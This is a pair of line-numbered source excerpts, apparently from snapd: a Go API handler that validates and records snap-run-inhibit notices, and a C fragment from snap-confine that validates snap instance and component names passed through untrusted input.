   252	func postNotices(c *Command, r *http.Request, user *auth.UserState) Response {
   253		requestUID, err := uidFromRequest(r)
   254		if err != nil {
   255			return Forbidden("cannot determine UID of request, so cannot create notice")
   256		}
   257	
   258		decoder := json.NewDecoder(r.Body)
   259		var inst noticeInstruction
   260		if err := decoder.Decode(&inst); err != nil {
   261			return BadRequest("cannot decode request body into notice instruction: %v", err)
   262		}
   263	
   264		st := c.d.overlord.State()
   265		st.Lock()
   266		defer st.Unlock()
   267	
   268		if err := inst.validate(r); err != nil {
   269			return err
   270		}
   271	
   272		noticeId, err := st.AddNotice(&requestUID, state.SnapRunInhibitNotice, inst.Key, nil)
   273		if err != nil {
   274			return InternalError("%v", err)
   275		}
   276	
   277		return SyncResponse(addedNotice{ID: noticeId})
   278	}
   279	
   280	type noticeInstruction struct {
   281		Action string           `json:"action"`
   282		Type   state.NoticeType `json:"type"`
   283		Key    string           `json:"key"`
   284		// NOTE: Data and RepeatAfter fields are not needed for snap-run-inhibit notices.
   285	}
   286	
   287	func (inst *noticeInstruction) validate(r *http.Request) *apiError {
   288		if inst.Action != "add" {
   289			return BadRequest("invalid action %q", inst.Action)
   290		}
   291		if err := state.ValidateNotice(inst.Type, inst.Key, nil); err != nil {
   292			return BadRequest("%s", err)
   293		}
   294	
   295		switch inst.Type {
   296		case state.SnapRunInhibitNotice:
   297			return inst.validateSnapRunInhibitNotice(r)
   298		default:
   299			return BadRequest(`cannot add notice with invalid type %q (can only add "snap-run-inhibit" notices)`, inst.Type)
   300		}
   301	}
   302	
   303	func (inst *noticeInstruction) validateSnapRunInhibitNotice(r *http.Request) *apiError {
   304		if fromSnapCmd, err := isRequestFromSnapCmd(r); err != nil {
   305			return InternalError("cannot check request source: %v", err)
   306		} else if !fromSnapCmd {
   307			return Forbidden("only snap command can record notices")
   308		}
   309	
   310		if err := naming.ValidateInstance(inst.Key); err != nil {
   311			return BadRequest("invalid key: %v", err)
   312		}
   313	
   314		return nil
   315	}

[snap-confine invocation/env/helper/mount/seccomp snippets]
    30	                        const char *snap_component) {
    31	    /* Snap instance name is conveyed via untrusted environment. It may be
    32	     * unset (typically when experimenting with snap-confine by hand). It
    33	     * must also be a valid snap instance name. */
    34	    if (snap_instance == NULL) {
    35	        die("cannot use NULL snap instance name");
    36	    }
    37	    sc_instance_name_validate(snap_instance, NULL);
    38	
    39	    // snap_component may be NULL if what we're confining isn't from a component
    40	    char *component_name = NULL;
    41	    char component_name_buffer[SNAP_NAME_LEN + 1] = {0};
    42	    if (snap_component != NULL) {
    43	        sc_snap_component_validate(snap_component, snap_instance, NULL);
    44	
    45	        sc_snap_split_snap_component(snap_component, NULL, 0, component_name_buffer, sizeof component_name_buffer);
    46	
    47	        component_name = component_name_buffer;
    48	    }
    49	
    50	    /* The security tag is conveyed via untrusted command line. It must be
    51	     * in agreement with snap instance name and must be a valid security
